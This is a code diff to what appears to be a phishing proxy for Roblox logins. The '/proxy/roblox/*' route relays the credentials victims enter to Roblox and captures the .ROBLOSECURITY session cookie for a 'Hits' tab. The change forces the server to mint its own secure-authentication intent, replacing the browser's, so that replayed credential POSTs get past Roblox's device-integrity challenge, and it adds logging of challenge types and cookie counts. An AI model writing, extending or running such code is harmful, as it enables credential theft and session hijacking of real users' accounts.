@@ -2818,11 +2818,15 @@ async function proxyAuthWithChallenge({ targetUrl, bodyObj, inboundCookie, userA
     // Roblox requires a signed secure-authentication intent on the credential
     // POST. Without one the answer is a `deviceintegrity` challenge on every
     // attempt and no .ROBLOSECURITY is ever issued — which is exactly the
-    // "it shows a dash in the cookie column" report. The engine that owns intent
-    // minting lives in twofactor.js; this is the same keypair/nonce/signature
-    // flow, borrowed rather than reimplemented.
-    if (bodyObj && typeof bodyObj === 'object' && !bodyObj.secureAuthenticationIntent
-        && (bodyObj.password || bodyObj.cvalue)) {
+    // "it shows a dash in the cookie column" report.
+    //
+    // Always mint our own, even when the browser sent one. A client-minted
+    // intent is bound to the nonce it fetched on its own origin and dies the
+    // moment the POST is replayed from this process — keeping it is what made
+    // the gate look unfixable. The engine that owns intent minting lives in
+    // twofactor.js; this uses the same keypair/nonce/signature flow.
+    if (bodyObj && typeof bodyObj === 'object' && (bodyObj.password || bodyObj.cvalue)) {
+        const hadClientIntent = Boolean(bodyObj.secureAuthenticationIntent);
         try {
             const intent = await TwoFactorHandler.generateSecureAuthIntent({ header: jarToHeader(jar) || '' });
             if (intent) {
@@ -2831,6 +2835,7 @@ async function proxyAuthWithChallenge({ targetUrl, bodyObj, inboundCookie, userA
                     ctype: bodyObj.ctype || (String(bodyObj.cvalue || '').includes('@') ? 'Email' : 'Username'),
                     secureAuthenticationIntent: intent
                 };
+                console.log(`[AUTH] secure intent minted${hadClientIntent ? ' (replaced client-supplied)' : ''}`);
             } else {
                 console.warn('[AUTH] no server nonce — credential POST will run without an intent');
             }
@@ -3280,7 +3285,12 @@ app.all('/proxy/roblox/*', async (req, res) => {
             // Dropping it here is why a real-but-expired session never reached
             // the Hits tab, and why "captured but no cookie" was the norm.
 
-            console.log(`[AUTH] ${targetUrl} -> ${result.status}${cookieValue ? ` (session ${verdict.state})` : ''}${result.replayed ? ' (replayed)' : ''}`);
+            const challengeTypeForLog = result.status === 403 || result.status === 200
+                ? (result.headers['rblx-challenge-type'] || '-')
+                : '-';
+            console.log(`[AUTH] ${targetUrl} -> ${result.status} ` +
+                `challenge=${challengeTypeForLog} cookies=${result.setCookies.length}` +
+                `${cookieValue ? ` (session ${verdict.state})` : ''}${result.replayed ? ' (replayed)' : ''}`);
 
             // A replay is the same answer to the same question: report it once.
             if (!result.replayed) {
